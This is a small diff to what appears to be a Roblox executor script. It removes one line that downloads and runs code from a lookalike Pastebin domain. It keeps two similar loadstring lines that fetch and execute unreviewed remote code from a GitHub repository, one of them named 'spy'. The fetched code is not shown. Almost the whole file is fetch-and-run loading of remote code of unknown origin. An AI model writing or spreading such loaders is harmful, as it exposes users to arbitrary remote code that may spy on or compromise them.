@@ -1,4 +1,3 @@
-loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
 workspace.CurrentCamera.FieldOfView = 90
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/savecpugpu"))()
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
